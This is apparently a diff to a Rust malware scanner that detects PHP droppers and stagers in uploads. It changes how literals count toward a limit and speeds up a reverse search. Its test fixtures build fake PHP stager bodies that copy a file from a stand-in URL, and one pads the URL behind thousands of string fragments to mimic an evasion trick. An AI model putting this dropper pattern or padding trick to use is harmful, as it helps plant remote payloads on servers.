@@ -23,8 +23,9 @@ const PROFILE_NAMES: usize = 8;
 /// How far back the start of a statement is looked for.
 const MAX_STATEMENT: usize = 512;
 
-/// Most string literals of one PHP layer read for URLs. A 64 KiB body can hold
-/// thousands; past this the layer is marked as over the limit.
+/// Most URL literals of one PHP layer read. A 64 KiB body can hold
+/// thousands; past this the layer is marked as over the limit. Other
+/// literals cost a scan only and do not count.
 const MAX_LITERALS: usize = 1024;
 
 /// Longest query argument name kept in an exploit value.
@@ -478,7 +479,9 @@ fn last_place(text: &[u8], word: &str) -> Option<(usize, usize)> {
     if word.is_empty() {
         return None;
     }
-    let start = text.windows(word.len()).rposition(|w| w == word)?;
+    // Linear: a window compare at every offset costs a long tag in a large
+    // upload, once per step, quadratic time.
+    let start = memchr::memmem::rfind(text, word)?;
     Some((start, start + word.len()))
 }
 
@@ -1026,14 +1029,20 @@ impl Urls<'_> {
             HashSet::new()
         };
         let fetched_by_name = |name: &[u8]| fetched.contains(&name.to_ascii_lowercase());
-        let literals = php_literals(text);
-        found.over |= literals.len() > MAX_LITERALS;
-        for &(start, end) in literals.iter().take(MAX_LITERALS) {
+        // Only URL literals count toward the limit: a string-array dropper
+        // holds thousands of short literals before the one URL that matters.
+        let mut read = 0;
+        for &(start, end) in &php_literals(text) {
             let Some((0, len, url)) = urls_in(&text[start..end]).next() else {
                 continue;
             };
             if len != end - start {
                 continue;
+            }
+            read += 1;
+            if read > MAX_LITERALS {
+                found.over = true;
+                break;
             }
             let promoted = match literal_use(text, start) {
                 Literal::Kept => true,
@@ -1454,7 +1463,7 @@ mod tests {
     fn a_layer_past_the_literal_limit_says_so() {
         let mut body = b"<?php copy('a','b');file_put_contents('x','y');".to_vec();
         for i in 0..MAX_LITERALS {
-            body.extend(format!("$v{i}='';").bytes());
+            body.extend(format!("$v{i}='http://a{i}.example.org/';").bytes());
         }
         body.extend(b"$late='http://late.example.org/x';copy($late,'y');");
         let x = post(std::str::from_utf8(&body).unwrap());
@@ -1463,6 +1472,23 @@ mod tests {
             of(&x, PieceKind::Stager)
                 .iter()
                 .all(|p| p.role != Role::Stager)
+        );
+    }
+
+    #[test]
+    fn short_literals_before_the_url_do_not_hide_it() {
+        // A string-array dropper: thousands of fragments, then the URL.
+        let mut body = b"<?php $a=[".to_vec();
+        for i in 0..2 * MAX_LITERALS {
+            body.extend(format!("'f{i}',").bytes());
+        }
+        body.extend(b"''];$u='http://late.example.org/x';copy($u,'y');");
+        let x = post(std::str::from_utf8(&body).unwrap());
+        assert!(!x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
+        assert!(
+            of(&x, PieceKind::Stager)
+                .iter()
+                .any(|p| p.role == Role::Stager)
         );
     }
 
